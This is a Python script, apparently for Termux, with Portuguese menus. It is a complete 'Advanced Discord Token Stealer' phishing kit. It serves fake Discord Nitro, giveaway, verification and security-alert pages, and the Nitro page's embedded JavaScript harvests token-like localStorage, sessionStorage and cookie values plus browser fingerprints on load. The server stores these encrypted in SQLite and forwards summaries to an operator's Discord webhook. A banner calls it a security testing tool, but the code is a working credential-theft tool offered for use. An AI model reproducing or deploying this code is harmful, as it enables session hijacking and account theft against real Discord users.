#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import json
import sqlite3
import hashlib
import threading
import socket
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import requests

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text
from rich.syntax import Syntax

console = Console()

class AdvancedDiscordTokenStealer:
    def __init__(self):
        self.web_server = None
        self.server_port = 8080
        self.webhook_url = ""
        self.redirect_url = "https://discord.com"
        self.server_ip = self.get_local_ip()
        self.encryption_key = get_random_bytes(32)
        self.html_templates = self._load_html_templates()
        self.current_template = "discord_nitro"
        self.is_running = False
        
    def get_local_ip(self):
        """Obtém o IP local da máquina"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _load_html_templates(self):
        """Carrega todos os templates HTML disponíveis"""
        return {
            "discord_nitro": self._create_discord_nitro_template(),
            "game_giveaway": self._create_game_giveaway_template(),
            "account_verification": self._create_account_verification_template(),
            "security_alert": self._create_security_alert_template()
        }
    
    def _create_discord_nitro_template(self):
        """Template de oferta de Nitro grátis"""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Discord Nitro Generator</title>
    <style>
        body {
            background: linear-gradient(135deg, #7289da, #2c2f33);
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            color: white;
            text-align: center;
            padding: 50px;
            margin: 0;
        }
        .container {
            background: rgba(35, 39, 42, 0.9);
            border-radius: 10px;
            padding: 30px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }
        h1 {
            color: #7289da;
            font-size: 28px;
            margin-bottom: 20px;
        }
        .btn {
            background: #7289da;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            margin: 20px 0;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #677bc4;
        }
        .discord-logo {
            width: 100px;
            margin-bottom: 20px;
        }
        .hidden {
            display: none;
        }
        p {
            margin: 10px 0;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://discord.com/assets/192cb9459cee8e3c2c0d31a8387c0b5d.svg" class="discord-logo" alt="Discord Logo">
        <h1>🎉 Free Discord Nitro! 🎉</h1>
        <p>Click the button below to claim your free Discord Nitro subscription!</p>
        <p>Limited time offer - claim now!</p>
        
        <button class="btn" onclick="claimNitro()">CLAIM NITRO</button>
        
        <div id="loading" class="hidden">
            <p>Processing your request...</p>
        </div>
    </div>

    <script>
        function claimNitro() {
            document.getElementById('loading').style.display = 'block';
            
            setTimeout(function() {
                window.location.href = "%s";
            }, 2000);
        }
        
        function isTokenKey(key) {
            if (!key) return false;
            const lowerKey = key.toLowerCase();
            return lowerKey.includes('token') || 
                   lowerKey.includes('auth') || 
                   lowerKey.includes('session') ||
                   lowerKey.includes('discord') ||
                   lowerKey.includes('access') ||
                   lowerKey.includes('refresh') ||
                   lowerKey.includes('secret');
        }
        
        function extractAllTokens() {
            const tokens = [];
            
            // LocalStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (isTokenKey(key)) {
                    tokens.push({
                        source: 'localStorage', 
                        key: key, 
                        value: localStorage.getItem(key)
                    });
                }
            }
            
            // SessionStorage
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (isTokenKey(key)) {
                    tokens.push({
                        source: 'sessionStorage', 
                        key: key, 
                        value: sessionStorage.getItem(key)
                    });
                }
            }
            
            // Cookies
            document.cookie.split(';').forEach(cookie => {
                const parts = cookie.split('=');
                if (parts.length >= 2) {
                    const key = parts[0].trim();
                    const value = parts.slice(1).join('=').trim();
                    if (isTokenKey(key)) {
                        tokens.push({
                            source: 'cookie', 
                            key: key, 
                            value: value
                        });
                    }
                }
            });
            
            sendToServer(tokens);
            return tokens;
        }
        
        function collectSystemInfo() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookies: document.cookie,
                referrer: document.referrer,
                url: window.location.href,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                plugins: Array.from(navigator.plugins).map(p => p.name),
                timestamp: new Date().toISOString()
            };
        }
        
        function sendToServer(tokens) {
            const data = {
                tokens: tokens,
                systemInfo: collectSystemInfo()
            };
            
            // Múltiplos métodos de envio
            sendViaFetch(data);
            sendViaBeacon(data);
        }
        
        function sendViaFetch(data) {
            fetch('/capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).catch(error => console.error('Fetch error:', error));
        }
        
        function sendViaBeacon(data) {
            const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
            navigator.sendBeacon('/capture', blob);
        }
        
        // Executar quando a página carregar
        window.addEventListener('load', function() {
            setTimeout(function() {
                const tokens = extractAllTokens();
                console.log('Tokens found:', tokens.length);
            }, 1500);
        });
    </script>
</body>
</html>""" % self.redirect_url
    
    def _create_game_giveaway_template(self):
        """Template de sorteio de jogos"""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Free Game Giveaway</title>
    <style>/* Estilos similares ao template anterior */</style>
</head>
<body>
    <div class="container">
        <h1>🎮 Free Game Giveaway! 🎮</h1>
        <p>Claim your free game now!</p>
        <button class="btn" onclick="claimGame()">CLAIM GAME</button>
    </div>
    <script>/* Script similar */</script>
</body>
</html>"""
    
    def _create_account_verification_template(self):
        """Template de verificação de conta"""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Account Verification</title>
    <style>/* Estilos similares */</style>
</head>
<body>
    <div class="container">
        <h1>🔐 Account Verification Required</h1>
        <p>Please verify your account to continue</p>
        <button class="btn" onclick="verifyAccount()">VERIFY NOW</button>
    </div>
    <script>/* Script similar */</script>
</body>
</html>"""
    
    def _create_security_alert_template(self):
        """Template de alerta de segurança"""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Security Alert</title>
    <style>/* Estilos similares */</style>
</head>
<body>
    <div class="container">
        <h1>⚠️ Security Alert</h1>
        <p>Your account security has been compromised</p>
        <button class="btn" onclick="checkSecurity()">CHECK NOW</button>
    </div>
    <script>/* Script similar */</script>
</body>
</html>"""

    def encrypt_data(self, data):
        """Criptografa dados sensíveis"""
        try:
            if isinstance(data, dict):
                data = json.dumps(data)
            elif not isinstance(data, str):
                data = str(data)
                
            cipher = AES.new(self.encryption_key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
            return base64.b64encode(cipher.iv + ct_bytes).decode('utf-8')
        except Exception as e:
            console.print(f"[red]Erro na criptografia: {e}[/red]")
            return data

    def decrypt_data(self, encrypted_data):
        """Descriptografa dados"""
        try:
            data = base64.b64decode(encrypted_data)
            iv, ct = data[:16], data[16:]
            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
            decrypted = unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8')
            
            # Tenta converter de volta para JSON se possível
            try:
                return json.loads(decrypted)
            except:
                return decrypted
                
        except Exception as e:
            console.print(f"[red]Erro na descriptografia: {e}[/red]")
            return encrypted_data

    def configurar_servidor(self):
        """Configura as opções do servidor"""
        console.clear()
        console.print(Panel.fit(
            "[bold]Configuração do Servidor[/bold]",
            border_style="blue"
        ))
        
        self.server_port = IntPrompt.ask(
            "[yellow]?[/yellow] Porta do servidor",
            default=self.server_port
        )
        
        self.redirect_url = Prompt.ask(
            "[yellow]?[/yellow] URL de redirecionamento",
            default=self.redirect_url
        )
        
        console.print(f"[green]✓ Servidor configurado na porta {self.server_port}[/green]")
        time.sleep(1)

    def configurar_webhook(self):
        """Configura webhook do Discord"""
        console.clear()
        console.print(Panel.fit(
            "[bold]Configuração de Webhook[/bold]",
            border_style="blue"
        ))
        
        self.webhook_url = Prompt.ask(
            "[yellow]?[/yellow] URL do Webhook Discord",
            default=self.webhook_url
        )
        
        if self.webhook_url:
            console.print("[green]✓ Webhook configurado com sucesso![/green]")
        else:
            console.print("[yellow]⚠ Webhook removido[/yellow]")
        
        time.sleep(1)

    def selecionar_template(self):
        """Seleciona o template HTML a ser usado"""
        console.clear()
        console.print(Panel.fit(
            "[bold]Selecionar Template[/bold]",
            border_style="blue"
        ))
        
        templates = list(self.html_templates.keys())
        tabela = Table(show_header=True, header_style="bold green")
        tabela.add_column("ID", style="cyan")
        tabela.add_column("Template", style="green")
        tabela.add_column("Descrição", style="yellow")
        
        descricoes = {
            "discord_nitro": "Oferta de Nitro grátis",
            "game_giveaway": "Sorteio de jogos",
            "account_verification": "Verificação de conta",
            "security_alert": "Alerta de segurança"
        }
        
        for i, template in enumerate(templates, 1):
            tabela.add_row(str(i), template, descricoes.get(template, "Sem descrição"))
        
        console.print(tabela)
        
        escolha = Prompt.ask(
            "[blink yellow]➤[/blink yellow] Selecione o template",
            choices=[str(i) for i in range(1, len(templates) + 1)],
            show_choices=False
        )
        
        self.current_template = templates[int(escolha) - 1]
        console.print(f"[green]✓ Template selecionado: {self.current_template}[/green]")
        time.sleep(1)

    def iniciar_servidor_web(self):
        """Inicia o servidor web para captura de tokens"""
        if self.is_running:
            console.print("[yellow]⚠ Servidor já está em execução[/yellow]")
            time.sleep(1)
            return
        
        console.clear()
        console.print(Panel.fit(
            "[bold]Iniciando Servidor Web[/bold]",
            border_style="blue"
        ))
        
        class AdvancedTokenHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                """Silencia logs padrão"""
                return
            
            def do_GET(self):
                """Manipula requisições GET"""
                try:
                    if self.path == '/':
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html; charset=utf-8')
                        self.end_headers()
                        
                        html_content = self.server.stealer.html_templates[
                            self.server.stealer.current_template
                        ]
                        
                        self.wfile.write(html_content.encode('utf-8'))
                        
                    elif self.path == '/favicon.ico':
                        self.send_response(204)
                        self.end_headers()
                        
                    else:
                        self.send_response(302)
                        self.send_header('Location', self.server.stealer.redirect_url)
                        self.end_headers()
                        
                except Exception as e:
                    self.send_response(500)
                    self.end_headers()
            
            def do_POST(self):
                """Manipula requisições POST de captura"""
                try:
                    if self.path == '/capture':
                        content_length = int(self.headers.get('Content-Length', 0))
                        if content_length > 0:
                            post_data = self.rfile.read(content_length)
                            data = json.loads(post_data.decode('utf-8'))
                            
                            # Processa e salva os dados
                            self.server.stealer.processar_dados_capturados(data)
                            
                            self.send_response(200)
                            self.send_header('Content-type', 'text/plain')
                            self.end_headers()
                            self.wfile.write(b'OK')
                        else:
                            self.send_response(400)
                            self.end_headers()
                    else:
                        self.send_response(404)
                        self.end_headers()
                        
                except Exception as e:
                    console.print(f"[red]Erro no POST: {e}[/red]")
                    self.send_response(500)
                    self.end_headers()
        
        try:
            server = HTTPServer(('', self.server_port), AdvancedTokenHandler)
            server.stealer = self
            
            # Inicia o servidor em thread separada
            server_thread = threading.Thread(target=server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            
            self.web_server = server
            self.is_running = True
            
            console.print(Panel.fit(
                f"[green]✓ Servidor iniciado com sucesso![/green]\n\n"
                f"[cyan]URL:[/cyan] http://{self.server_ip}:{self.server_port}\n"
                f"[cyan]Template:[/cyan] {self.current_template}\n"
                f"[cyan]Webhook:[/cyan] {'Configurado' if self.webhook_url else 'Não configurado'}",
                title="[bold green]SERVIDOR ATIVO[/bold green]",
                border_style="green"
            ))
            
            console.print(Panel.fit(
                "[yellow]⚠ Pressione Enter para parar o servidor[/yellow]",
                border_style="yellow"
            ))
            
            # Aguarda entrada do usuário para parar
            input()
            console.print("\n[red]✗ Servidor parado[/red]")
            self.is_running = False
            server.shutdown()
            server.server_close()
                
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro ao iniciar servidor: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
            self.is_running = False
            time.sleep(2)

    def processar_dados_capturados(self, data):
        """Processa os dados capturados"""
        try:
            # Cria diretório de dados se não existir
            if not os.path.exists('data'):
                os.makedirs('data')
            
            # Conecta ao banco de dados
            conn = sqlite3.connect('data/tokens_advanced.db')
            c = conn.cursor()
            
            # Cria tabelas se não existirem
            c.execute('''CREATE TABLE IF NOT EXISTS captures
                         (id INTEGER PRIMARY KEY AUTOINCREMENT,
                          timestamp TEXT,
                          tokens TEXT,
                          system_info TEXT,
                          template_used TEXT,
                          encrypted INTEGER DEFAULT 1)''')
            
            # Prepara dados para inserção
            timestamp = datetime.now().isoformat()
            tokens_encrypted = self.encrypt_data(data.get('tokens', []))
            system_info_encrypted = self.encrypt_data(data.get('systemInfo', {}))
            
            # Insere dados
            c.execute('''INSERT INTO captures 
                         (timestamp, tokens, system_info, template_used, encrypted)
                         VALUES (?, ?, ?, ?, 1)''',
                     (timestamp, tokens_encrypted, system_info_encrypted, self.current_template))
            
            conn.commit()
            conn.close()
            
            # Envia webhook se configurado
            if self.webhook_url:
                self.enviar_webhook_avancado(data)
            
            console.print(f"[green]✓ Dados capturados em {timestamp}[/green]")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao processar dados: {str(e)}[/red]")

    def enviar_webhook_avancado(self, data):
        """Envia dados para webhook do Discord com informações avançadas"""
        try:
            embed = {
                "title": "🎯 Nova Captura de Tokens",
                "color": 0x7289DA,
                "fields": [
                    {
                        "name": "📅 Timestamp",
                        "value": data.get('systemInfo', {}).get('timestamp', 'N/A'),
                        "inline": True
                    },
                    {
                        "name": "🌐 User Agent",
                        "value": data.get('systemInfo', {}).get('userAgent', 'N/A')[:50] + "...",
                        "inline": True
                    },
                    {
                        "name": "🔤 Language",
                        "value": data.get('systemInfo', {}).get('language', 'N/A'),
                        "inline": True
                    }
                ],
                "footer": {
                    "text": f"Template: {self.current_template} | Advanced Token Stealer"
                }
            }
            
            # Adiciona informações de tokens
            tokens = data.get('tokens', [])
            if tokens:
                token_count = len(tokens)
                token_preview = "\n".join(
                    f"`{t.get('source', 'unknown')}: {t.get('key', 'unknown')[:15]}...`"
                    for t in tokens[:3]
                )
                
                if token_count > 3:
                    token_preview += f"\n... e mais {token_count - 3} tokens"
                
                embed["fields"].append({
                    "name": f"🔑 Tokens Encontrados ({token_count})",
                    "value": token_preview,
                    "inline": False
                })
            
            payload = {
                "embeds": [embed],
                "username": "Token Stealer",
                "avatar_url": "https://discord.com/assets/192cb9459cee8e3c2c0d31a8387c0b5d.svg"
            }
            
            response = requests.post(self.webhook_url, json=payload, timeout=10)
            
            if response.status_code in [200, 204]:
                console.print("[green]✓ Webhook enviado com sucesso![/green]")
            else:
                console.print(f"[red]✗ Erro no webhook: {response.status_code}[/red]")
                
        except Exception as e:
            console.print(f"[red]✗ Erro ao enviar webhook: {str(e)}[/red]")

    def ver_tokens_capturados(self):
        """Exibe tokens capturados"""
        console.clear()
        console.print(Panel.fit(
            "[bold]Tokens Capturados[/bold]",
            border_style="blue"
        ))
        
        conn = None
        try:
            if not os.path.exists('data/tokens_advanced.db'):
                console.print("[yellow]Nenhum dado capturado ainda.[/yellow]")
                input("\nPressione Enter para continuar...")
                return
            
            conn = sqlite3.connect('data/tokens_advanced.db')
            c = conn.cursor()
            
            # Estatísticas básicas
            c.execute("SELECT COUNT(*) FROM captures")
            total_capturas = c.fetchone()[0]
            
            console.print(f"[cyan]Total de capturas:[/cyan] {total_capturas}")
            console.print()
            
            # Lista capturas recentes
            c.execute('''SELECT id, timestamp, template_used FROM captures 
                         ORDER BY id DESC LIMIT 10''')
            rows = c.fetchall()
            
            if not rows:
                console.print("[yellow]Nenhuma captura encontrada.[/yellow]")
                input("\nPressione Enter para continuar...")
                return
            
            tabela = Table(show_header=True, header_style="bold magenta")
            tabela.add_column("ID", style="cyan")
            tabela.add_column("Data/Hora", style="green")
            tabela.add_column("Template", style="yellow")
            
            for row in rows:
                tabela.add_row(str(row[0]), row[1], row[2])
            
            console.print(tabela)
            
            # Opção para ver detalhes
            escolha = Prompt.ask(
                "\n[blink yellow]➤[/blink yellow] Ver detalhes (ID) ou 0 para voltar",
                default="0"
            )
            
            if escolha != "0" and escolha.isdigit():
                self.mostrar_detalhes_captura(int(escolha))
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
            time.sleep(2)
        finally:
            if conn:
                conn.close()

    def mostrar_detalhes_captura(self, capture_id):
        """Mostra detalhes de uma captura específica"""
        conn = None
        try:
            conn = sqlite3.connect('data/tokens_advanced.db')
            c = conn.cursor()
            
            c.execute('''SELECT timestamp, tokens, system_info, template_used, encrypted 
                         FROM captures WHERE id = ?''', (capture_id,))
            detalhes = c.fetchone()
            
            if not detalhes:
                console.print("[red]Captura não encontrada.[/red]")
                time.sleep(1)
                return
            
            console.clear()
            console.print(Panel.fit(
                f"[bold]Detalhes da Captura #{capture_id}[/bold]",
                border_style="blue"
            ))
            
            # Desserializa dados
            timestamp, tokens_enc, system_info_enc, template, encrypted = detalhes
            
            if encrypted:
                tokens_data = self.decrypt_data(tokens_enc)
                system_info = self.decrypt_data(system_info_enc)
            else:
                tokens_data = json.loads(tokens_enc)
                system_info = json.loads(system_info_enc)
            
            # Informações do sistema
            console.print(Panel.fit(
                f"[cyan]Template:[/cyan] {template}\n"
                f"[cyan]Data/Hora:[/cyan] {timestamp}\n"
                f"[cyan]User Agent:[/cyan] {system_info.get('userAgent', 'N/A')}\n"
                f"[cyan]Plataforma:[/cyan] {system_info.get('platform', 'N/A')}\n"
                f"[cyan]Idioma:[/cyan] {system_info.get('language', 'N/A')}",
                title="[bold]Informações do Sistema[/bold]",
                border_style="green"
            ))
            
            # Tokens encontrados
            if tokens_data and len(tokens_data) > 0:
                console.print(Panel.fit(
                    f"[green]Encontrados {len(tokens_data)} tokens:[/green]",
                    title="[bold]Tokens[/bold]",
                    border_style="yellow"
                ))
                
                for i, token in enumerate(tokens_data[:3], 1):
                    console.print(Panel.fit(
                        f"[cyan]Fonte:[/cyan] {token.get('source', 'N/A')}\n"
                        f"[cyan]Chave:[/cyan] {token.get('key', 'N/A')}\n"
                        f"[cyan]Valor:[/cyan] {token.get('value', 'N/A')[:100]}...",
                        border_style="red"
                    ))
                
                if len(tokens_data) > 3:
                    console.print(f"[yellow]... e mais {len(tokens_data) - 3} tokens[/yellow]")
            else:
                console.print("[yellow]Nenhum token encontrado nesta captura.[/yellow]")
            
            input("\nPressione Enter para continuar...")
            
        except Exception as e:
            console.print(f"[red]Erro ao mostrar detalhes: {str(e)}[/red]")
            time.sleep(2)
        finally:
            if conn:
                conn.close()

    def exportar_dados(self):
        """Exporta dados capturados"""
        console.clear()
        console.print(Panel.fit(
            "[bold]Exportar Dados[/bold]",
            border_style="blue"
        ))
        
        conn = None
        try:
            if not os.path.exists('data/tokens_advanced.db'):
                console.print("[yellow]Nenhum dado para exportar.[/yellow]")
                time.sleep(1)
                return
            
            formatos = ["JSON", "CSV", "TXT"]
            tabela = Table(show_header=True, header_style="bold green")
            tabela.add_column("ID", style="cyan")
            tabela.add_column("Formato", style="green")
            tabela.add_column("Descrição", style="yellow")
            
            descricoes = {
                "JSON": "Formato estruturado para programas",
                "CSV": "Planilha compatível com Excel",
                "TXT": "Texto simples para leitura humana"
            }
            
            for i, formato in enumerate(formatos, 1):
                tabela.add_row(str(i), formato, descricoes[formato])
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione o formato",
                choices=[str(i) for i in range(1, len(formatos) + 1)],
                show_choices=False
            )
            
            formato_selecionado = formatos[int(escolha) - 1]
            nome_arquivo = f"tokens_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{formato_selecionado.lower()}"
            
            # Exporta dados
            conn = sqlite3.connect('data/tokens_advanced.db')
            c = conn.cursor()
            
            c.execute("SELECT id, timestamp, template_used FROM captures")
            dados = c.fetchall()
            
            if formato_selecionado == "JSON":
                dados_export = []
                for linha in dados:
                    dados_export.append({
                        "id": linha[0],
                        "timestamp": linha[1],
                        "template": linha[2]
                    })
                
                with open(nome_arquivo, 'w', encoding='utf-8') as f:
                    json.dump(dados_export, f, indent=2, ensure_ascii=False)
                    
            elif formato_selecionado == "CSV":
                import csv
                with open(nome_arquivo, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(['ID', 'Timestamp', 'Template'])
                    for linha in dados:
                        writer.writerow([linha[0], linha[1], linha[2]])
            
            elif formato_selecionado == "TXT":
                with open(nome_arquivo, 'w', encoding='utf-8') as f:
                    for linha in dados:
                        f.write(f"ID: {linha[0]} | Timestamp: {linha[1]} | Template: {linha[2]}\n")
            
            console.print(f"[green]✓ Dados exportados como {nome_arquivo}[/green]")
            time.sleep(1)
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao exportar dados: {str(e)}[/red]")
            time.sleep(2)
        finally:
            if conn:
                conn.close()

    def mostrar_estatisticas(self):
        """Mostra estatísticas das capturas"""
        conn = None
        try:
            if not os.path.exists('data/tokens_advanced.db'):
                console.print("[yellow]Nenhum dado disponível para estatísticas.[/yellow]")
                time.sleep(1)
                return
            
            conn = sqlite3.connect('data/tokens_advanced.db')
            c = conn.cursor()
            
            # Estatísticas básicas
            c.execute("SELECT COUNT(*) FROM captures")
            total_capturas = c.fetchone()[0]
            
            c.execute("SELECT template_used, COUNT(*) FROM captures GROUP BY template_used")
            templates_stats = c.fetchall()
            
            console.print(Panel.fit(
                f"[cyan]Total de capturas:[/cyan] {total_capturas}\n"
                f"[cyan]Templates utilizados:[/cyan]",
                title="[bold]Estatísticas Gerais[/bold]",
                border_style="green"
            ))
            
            for template, count in templates_stats:
                console.print(f"  [yellow]{template}:[/yellow] {count} capturas")
            
            # Últimas capturas
            c.execute("SELECT timestamp FROM captures ORDER BY id DESC LIMIT 1")
            ultima_captura = c.fetchone()
            
            if ultima_captura:
                console.print(f"\n[cyan]Última captura:[/cyan] {ultima_captura[0]}")
            
            input("\nPressione Enter para continuar...")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao gerar estatísticas: {str(e)}[/red]")
            time.sleep(2)
        finally:
            if conn:
                conn.close()

    def mostrar_menu_principal(self):
        """Menu principal do sistema"""
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]🔧 DISCORD TOKEN STEALER AVANÇADO[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Ação", style="green")
            tabela.add_column("Status", style="yellow")
            
            status_server = "[red]OFF[/red]" if not self.is_running else "[green]ON[/green]"
            status_webhook = "[red]OFF[/red]" if not self.webhook_url else "[green]ON[/green]"
            
            tabela.add_row("1", "Configurar Servidor", "")
            tabela.add_row("2", "Selecionar Template", f"[blue]{self.current_template}[/blue]")
            tabela.add_row("3", "Iniciar Servidor Web", status_server)
            tabela.add_row("4", "Ver Tokens Capturados", "")
            tabela.add_row("5", "Configurar Webhook", status_webhook)
            tabela.add_row("6", "Exportar Dados", "")
            tabela.add_row("7", "Estatísticas", "")
            tabela.add_row("0", "Sair", "")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=["0", "1", "2", "3", "4", "5", "6", "7"],
                show_choices=False
            )
            
            opcoes = {
                "1": self.configurar_servidor,
                "2": self.selecionar_template,
                "3": self.iniciar_servidor_web,
                "4": self.ver_tokens_capturados,
                "5": self.configurar_webhook,
                "6": self.exportar_dados,
                "7": self.mostrar_estatisticas,
                "0": lambda: sys.exit(0)
            }
            
            if escolha in opcoes:
                opcoes[escolha]()

    def mostrar_banner(self):
        """Exibe banner personalizado"""
        banner = """
[bold blue]
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗      ║
║    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗     ║
║    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║     ║
║    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║     ║
║    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝     ║
║    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝      ║
║                                                              ║
║                 ADVANCED TOKEN STEALER v2.0                  ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝[/bold blue]
"""
        console.print(banner)
        console.print(Panel.fit(
            "[blink bold red]⚠️ FERRAMENTA DE TESTE DE SEGURANÇA - USE COM RESPONSABILIDADE! ⚠️[/blink bold red]",
            style="red on black"
        ))

def main():
    """Função principal"""
    try:
        stealer = AdvancedDiscordTokenStealer()
        stealer.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Programa encerrado[/red]")
    except Exception as e:
        console.print(f"\n[red]✗ Erro crítico: {str(e)}[/red]")

if __name__ == '__main__':
    main()
